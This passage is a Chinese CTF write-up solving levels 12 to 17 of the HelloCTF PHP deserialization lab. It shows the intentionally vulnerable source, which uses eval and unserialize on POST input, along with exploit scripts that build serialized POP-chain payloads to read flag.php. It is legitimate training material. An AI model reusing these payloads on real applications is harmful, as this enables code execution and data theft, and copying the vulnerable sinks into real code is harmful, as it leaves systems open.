<p>解题的话直接用 chance 依次输入 ‘h’,’e’,’l’,’I’,’o’,’c’,’t’,’f’,’f’,’l’,’a’,’g’ 拼接就行了。注意，想要访问父类的 \0FLAG\0f，即%00FLAG%00a 进行 get 传参</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">h:  HelloCTF&#123;</span><br><span class="line">e:  Th3_</span><br><span class="line">l:  __sleep_function_</span><br><span class="line">I:  _is_</span><br><span class="line">o: called_</span><br><span class="line">c:  before_</span><br><span class="line">t:  serialization_</span><br><span class="line">f:  t0_</span><br><span class="line">f:  clean_</span><br><span class="line">l:  up_</span><br><span class="line">a:  4nd_</span><br><span class="line">g:  select_variab1es&#125;</span><br><span class="line">HelloCTF&#123;Th3___sleep_function__is_called_before_serialization_t0_clean_up_4nd_select_variab1es&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Level13-toString"><a href="#Level13-toString" class="headerlink" title="Level13 : __toString()"></a>Level13 : __toString()</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">--- HelloCTF - 反序列化靶场 关卡 13 __toString()  --- </span><br><span class="line"></span><br><span class="line">__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。</span><br><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: 探姬(@ProbiusOfficial)</span><br><span class="line"># @Date:   2024-07-01 20:30</span><br><span class="line"># @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs</span><br><span class="line"># @email:  admin@hello-ctf.com</span><br><span class="line"># @link:   hello-ctf.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">class FLAG &#123;</span><br><span class="line">    function __toString() &#123;</span><br><span class="line">        echo &quot;I&#x27;m a string ~~~&quot;;</span><br><span class="line">        include &#x27;flag.php&#x27;;</span><br><span class="line">        return $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new FLAG();</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;o&#x27;])) &#123;</span><br><span class="line">    eval($_POST[&#x27;o&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。</p>
<p>题解就直接输出$obj 就行了即 o&#x3D;echo $obj;</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1756094236639-19cdc69b-be33-4c1e-b322-bed717e50435.png"></p>
<h1 id="Level14-invoke"><a href="#Level14-invoke" class="headerlink" title="Level14 : __invoke()"></a>Level14 : __invoke()</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">--- HelloCTF - 反序列化靶场 关卡 14 : __invoke() --- </span><br><span class="line"></span><br><span class="line">当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。例如 $obj()。</span><br><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: 探姬(@ProbiusOfficial)</span><br><span class="line"># @Date:   2024-07-01 20:30</span><br><span class="line"># @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs</span><br><span class="line"># @email:  admin@hello-ctf.com</span><br><span class="line"># @link:   hello-ctf.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">class FLAG&#123;</span><br><span class="line">    function __invoke($x) &#123;</span><br><span class="line">        if ($x == &#x27;get_flag&#x27;) &#123;</span><br><span class="line">            include &#x27;flag.php&#x27;;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new FLAG();</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;o&#x27;])) &#123;</span><br><span class="line">    eval($_POST[&#x27;o&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。例如 $obj()。</p>
<p>这道题记得传参，即形参传“ get_flag ”给 $x</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1756094463743-7c18a0b8-162d-4f4f-9c97-be665d1be0da.png"></p>
<h1 id="Level15-POP链初步"><a href="#Level15-POP链初步" class="headerlink" title="Level15 : POP链初步"></a>Level15 : POP链初步</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 15 : POP链初步 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">世界的本质其实就是套娃（x</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FLAG in flag.php */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;c = <span class="variable">$c</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$d</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;d = <span class="variable">$d</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;d-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">destnation</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cmd</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd-&gt;a-&gt;b-&gt;c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp：链子 D-&gt;destnation-&gt;A-&gt;B-&gt;C</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = <span class="string">&quot;echo file_get_contents(&#x27;flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">destnation</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;d = <span class="keyword">new</span> <span class="title function_ invoke__">destnation</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;d-&gt;cmd = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;d-&gt;cmd-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;d-&gt;cmd-&gt;a-&gt;b = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#输出：O:1:&quot;D&quot;:1:&#123;s:1:&quot;d&quot;;O:10:&quot;destnation&quot;:1:&#123;s:3:&quot;cmd&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:35:&quot;echo file_get_contents(&#x27;flag.php&#x27;);&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1756111341540-f518c370-07de-457c-8efd-28f4def3f4b9.png"></p>
<p>没有输出，源代码里找</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1756111322970-3582bbba-4187-474a-9955-d78c02c3a186.png"></p>
<h1 id="Level16-zePOP"><a href="#Level16-zePOP" class="headerlink" title="Level16 : zePOP"></a>Level16 : zePOP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 16 : zePOP--- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__wakeUp() 方法用于反序列化时自动调用。例如 unserialize()。</span></span><br><span class="line"><span class="comment">__invoke() 方法用于一个对象被当成函数时应该如何回应。例如 $obj() 应该显示些什么。</span></span><br><span class="line"><span class="comment">__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">试着把他们串起来吧ww</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$f</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">INIT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="string">&#x27; is awake!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>链子很明显了，先反序列化触发 __wakeup，__wakeup()又触发 __toString()，__toString() 又 return $f()，触发__invoke()。链子是 INIT-&gt;B-&gt;A</p>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">INIT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">INIT</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;b = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1756111798390-cdd08507-0769-4b37-ba2a-47d9cb93722d.png"></p>
<h1 id="Level17-字符串逃逸基础"><a href="#Level17-字符串逃逸基础" class="headerlink" title="Level17 : 字符串逃逸基础"></a>Level17 : 字符串逃逸基础</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Class A is NULL: &#x27;O:1:&quot;A&quot;:0:&#123;&#125;&#x27;</span></span><br><span class="line"><span class="comment">Class B is a class with 3 properties: &#x27;O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:4:&quot;*b&quot;;s:3:&quot;CTF&quot;;s:4:&quot;Bc&quot;;s:10:&quot;FLAG&#123;TEST&#125;&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="comment">After replace B with A,we unserialize it and dump :</span></span><br><span class="line"><span class="comment">object(A)#1 (3) &#123; [&quot;a&quot;]=&gt; string(5) &quot;Hello&quot; [&quot;b&quot;:protected]=&gt; string(3) &quot;CTF&quot; [&quot;c&quot;:&quot;A&quot;:private]=&gt; string(10) &quot;FLAG&#123;TEST&#125;&quot; &#125; &lt;?php</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 17 : 字符串逃逸基础 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">序列化和反序列化的规则特性_无中生有：当成员属性的实际数量符合序列化字符串中对应属性值时，似乎不会做任何检查？</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Class A is NULL: &#x27;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>()).<span class="string">&quot;&#x27;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;FLAG&#123;TEST&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Class B is a class with 3 properties: &#x27;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>()).<span class="string">&quot;&#x27;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseString</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseString</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="variable">$serliseString</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After replace B with A,we unserialize it and dump :&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serliseString</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> <span class="keyword">instanceof</span> A &amp;&amp; <span class="variable">$a</span>-&gt;helloctfcmd == <span class="string">&quot;get_flag&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what&#x27;s rule?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目给的示例是直接将序列化的 <font style="color:rgb(0, 0, 0);">O:1:”</font><strong><font style="color:#DF2A3F;">B</font></strong><font style="color:rgb(0, 0, 0);">“:3:{s:1:”a”;s:5:”Hello”;s:4:”*b”;s:3:”CTF”;s:4:”Bc”;s:10:”FLAG{TEST}”;} 中的 B 改成 A，之后 var_dump 的类里面的东西直接就是 A 中的实例了。</font></p>
<p>instanceof 用于确定一个 PHP 变量是否属于某一类class的实例。</p>
